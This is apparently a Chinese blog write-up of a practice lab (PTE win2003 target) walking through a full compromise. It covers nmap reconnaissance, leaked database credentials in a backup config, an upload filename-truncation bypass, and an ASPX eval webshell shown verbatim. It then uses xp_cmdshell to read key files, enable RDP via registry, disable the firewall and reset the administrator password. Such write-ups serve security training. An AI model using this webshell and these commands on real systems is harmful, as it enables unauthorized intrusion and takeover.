---
layout: post
title: PTE-win2003
subtitle: PTE-win2003
date: 2025-08-16 13:07
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
  - 靶场实战
number headings: first-level 2, max 4, 1.1., auto
published: true
---
## 1. 信息搜集

扫描存活主机

```shell
nmap -sn 192.168.163.0/24
```

发现靶机：192.168.163.126

![image.png](https://img.ghostliner.top/HSgn6X.png)

扫描端口

```shell
nmap -T5 -sS -p- 192.168.163.128
```

![image.png|450](https://img.ghostliner.top/EmOcpC.png)

操作系统扫描

```shell
nmap -O 192.168.163.128
```

![image.png|450](https://img.ghostliner.top/oCkofO.png)

端口指纹扫描

```shell
nmap -T5 -sS -sV -p 1433,27689 192.168.163.128
```

确定为 SQLServer 和 http 服务

![image.png|450](https://img.ghostliner.top/smorTh.png)

## 2. 网站测试

访问网站

![image.png](https://img.ghostliner.top/m7FB5u.png)

登录测试，用户名：aaaa，密码：1234
提示用户名不存在

![image.png|500](https://img.ghostliner.top/yjySog.png)

用户名：admin，密码：123456
提示密码错误，说明存在用户 admin

![image.png|500](https://img.ghostliner.top/r7FOje.png)

### 2.1. 目录扫描

![image.png](https://img.ghostliner.top/C5mp68.png)

访问 robots.txt 未发现有用信息

![image.png](https://img.ghostliner.top/832qWh.png)

访问 admin 和 upfile 目录无权限

![image.png|500](https://img.ghostliner.top/hTiWCJ.png)

访问 web.config.bak 文件

![image.png](https://img.ghostliner.top/Tk8LEM.png)

发现数据库信息：
- 数据库名：FileManage
- 用户名：down
- 密码：downsql

## 3. 数据库测试

使用 Navicat 连接数据库

![image.png|500](https://img.ghostliner.top/om5uKW.png)

在 zsb 表中发现 key3

![image.png|500](https://img.ghostliner.top/NZs4dE.png)

发现网站 admin 登录密码：asdadwn_d2112

![image.png|500](https://img.ghostliner.top/HlTVaa.png)

测试当前数据库用户是否有命令执行权限

![image.png|500](https://img.ghostliner.top/FArvtb.png)

无权限，继续测试网站

## 4. getshell

登录网站后获取到 key1

![image.png|500](https://img.ghostliner.top/UP3Quu.png)

发现文件上传页面

![image.png|500](https://img.ghostliner.top/HTwzx0.png)

发现文件上传记录，获得提示：
- **注意：文件名过长会被系统截取包括系统时间在内的前 32 位字符作为文件名，请上传的文件名称不要过长，为您带来的不便，敬请谅解。**

**利用思路**：上传八位字符文件名+aspx 后缀+txt 后缀，上传后 `.txt` 后缀被截断，保留 `.aspx`

![image.png|500](https://img.ghostliner.top/sxZLGV.png)

访问图片文件报错，获取到上传文件路径 `/upfile/affix/`

![image.png](https://img.ghostliner.top/8A4Fow.png)

访问 `636625082296562500-bbbbbbbb.aspx` 成功无内容

上传一句话木马，文件名：`12345678.aspx.txt`

```asp
<%@ Page Language="Jscript"%><%Response.Write(eval(Request.Item["z"],"unsafe"));%>
```

上传成功，查看记录

![image.png|500](https://img.ghostliner.top/nfQPBF.png)

蚁剑连接成功，发现 `key1key.key`、`web.config.bak.2017-12-12` 文件

![image.png|500](https://img.ghostliner.top/WtAvDl.png)

获取到 key2

![image.png|500](https://img.ghostliner.top/anTE4t.png)

获取到 sa 账号密码： cisp-pte@sa

![image.png](https://img.ghostliner.top/GaVGKg.png)

webshell 查看权限，发现权限低

![image.png|500](https://img.ghostliner.top/Jkrwz3.png)

## 5. xp_cmdshell

使用 sa 连接数据库

![image.png|500](https://img.ghostliner.top/i5E17D.png)

查看权限为 system

![image.png|500](https://img.ghostliner.top/yxiTRJ.png)

查找 key 文件

```sql
EXEC xp_cmdshell 'for /r "c:\" %i in (key.*) do echo %i';
```

发现桌面存在 `key.txt`

![image.png|500](https://img.ghostliner.top/3ZeS6O.png)

查看内容

```sql
EXEC xp_cmdshell 'type "c:\Documents and Settings\Administrator\桌面\key.txt"';
```

获取到 key3

![image.png|500](https://img.ghostliner.top/jAKOuC.png)

## 6. 开启远程桌面

蚁剑上传 `3389.bat`

```batch
@REM 3389.bat
echo Windows Registry Editor Version 5.00>>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>>3389.reg 
echo "fDenyTSConnections"=dword:00000000>>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]>>3389.reg 
echo "PortNumber"=dword:00000d3d>>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]>>3389.reg 
echo "PortNumber"=dword:00000d3d>>3389.reg 
regedit /s 3389.reg 
del 3389.reg
```

phpmyadmin执行脚本

```sql
EXEC xp_cmdshell 'd:\web\3389.bat';
-- 查看端口开发状态
EXEC xp_cmdshell 'netstat -ano';
```

3389 端口开发，说明脚本执行成功

![image.png|500](https://img.ghostliner.top/cZmcXn.png)

关闭防火墙

```sql
EXEC xp_cmdshell 'netsh firewall set opmod disable';
-- 查看防火墙状态
EXEC xp_cmdshell 'netsh firewall show state';
```

![image.png|500](https://img.ghostliner.top/ucVAIa.png)

nmap 测试 3389 端口状态

```shell
nmap -p 3389 192.168.163.128
```

![image.png|500](https://img.ghostliner.top/XHaccT.png)

修改管理员密码

```sql
EXEC xp_cmdshell 'net user administrator 123456';
```

远程桌面连接到 win2003

![image.png|500](https://img.ghostliner.top/WZtiJp.png)

桌面发现 key3

![image.png|500](https://img.ghostliner.top/2mNrDz.png)
